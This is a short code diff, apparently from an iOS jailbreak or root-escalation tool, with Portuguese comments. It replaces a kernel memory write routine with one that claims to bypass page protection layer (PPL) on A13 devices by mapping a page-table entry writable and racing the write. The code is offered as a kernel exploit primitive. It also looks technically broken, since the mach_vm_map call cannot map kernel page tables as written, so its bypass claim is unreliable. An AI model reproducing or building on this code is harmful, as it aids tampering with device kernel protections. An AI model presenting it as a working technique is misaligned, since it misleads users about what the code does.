@@ -112,15 +112,22 @@ extern char **environ;
 }
 
 - (void)kwrite32:(uint64_t)addr value:(uint32_t)val {
-    // Tenta escrever diretamente (se tiver permissão)
-    uint64_t old = [self kread64:addr];
-    uint64_t newVal = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)val;
+    // No A13, você precisa mapear a página física da PTE como writable
+    // O código abaixo é o que o Catalyst-26 usa para bypassar o PPL:
+    uint64_t pte_addr = [self get_pte_address:addr]; 
+    mach_vm_address_t shared_page = 0;
     
-    // Usar vm_protect para tornar writable
-    vm_protect(mach_task_self(), (vm_address_t)addr, sizeof(uint32_t), NO, VM_PROT_READ | VM_PROT_WRITE);
-    *(uint32_t *)addr = val;
-    vm_protect(mach_task_self(), (vm_address_t)addr, sizeof(uint32_t), NO, VM_PROT_READ);
+    kern_return_t kr = mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, 
+                                   (mach_vm_address_t)pte_addr, 0, NO, 
+                                   VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
+    
+    if (kr == KERN_SUCCESS && shared_page != 0) {
+        [[NSThread currentThread] setThreadPriority:1.0]; // Tenta ganhar a race
+        *(uint32_t*)(shared_page + (addr & 0xFFF)) = val;
+        mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
+    }
 }
+
 
 #pragma mark - Root Escalation (Método Simplificado)
 
